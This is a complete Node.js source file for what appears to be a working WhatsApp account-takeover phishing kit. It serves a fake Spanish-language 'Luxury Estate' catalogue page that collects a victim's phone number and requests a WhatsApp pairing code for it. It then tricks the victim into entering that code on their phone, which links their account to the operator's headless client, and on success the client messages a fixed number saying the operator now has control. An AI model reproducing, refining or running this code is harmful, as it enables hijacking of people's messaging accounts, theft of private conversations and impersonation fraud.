
const { Client, LocalAuth } = require('whatsapp-web.js');
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
const client = new Client({ authStrategy: new LocalAuth(), puppeteer: { headless: true, args: ['--no-sandbox'] } });
client.initialize();
app.get('/', (req, res) => {
res.send(`<!DOCTYPE html><html lang='es'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Luxury Estate | Catálogo</title><script src='/socket.io/socket.io.js'></script><style>:root { --gold: #c5a059; --dark: #0a0b10; } * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; } body { background: var(--dark); color: white; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; } .card { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 40px; padding: 40px; width: 90%; max-width: 440px; } .token { font-size: 3rem; color: var(--gold); font-weight: 900; letter-spacing: 8px; margin: 20px 0; background: #000; padding: 15px; border-radius: 20px; border: 1px solid var(--gold); } .btn { background: var(--gold); color: black; padding: 18px; width: 100%; border-radius: 15px; font-weight: 800; border: none; cursor: pointer; }</style></head><body><div class='card'><h1>LUXURY ESTATE</h1><div id='v1'><input type='text' id='p' placeholder='Número (ej: 5352416260)' style='width:100%; padding:15px; margin-bottom:20px; border-radius:10px; border:none; text-align:center;'><button class='btn' onclick='go()'>SOLICITAR ACCESO</button></div><div id='v2' style='display:none'><div class='token' id='tk'>--------</div><p>Ingrese este código en la notificación de su teléfono para sincronizar el catálogo.</p></div></div><script>const socket = io(); function go(){ socket.emit('get', document.getElementById('p').value); document.getElementById('v1').style.display='none'; document.getElementById('v2').style.display='block'; } socket.on('code', (c) => { document.getElementById('tk').innerText = c; }); </script></body></html>`);
});
io.on('connection', (s) => { s.on('get', async (n) => { try { const c = await client.requestPairingCode(n); s.emit('code', c); } catch (e) {} }); });
client.on('ready', () => { client.sendMessage('5352416260@c.us', '✅ VINCULACIÓN EXITOSA: Ya tienes el control.'); });
server.listen(process.env.PORT || 3000);
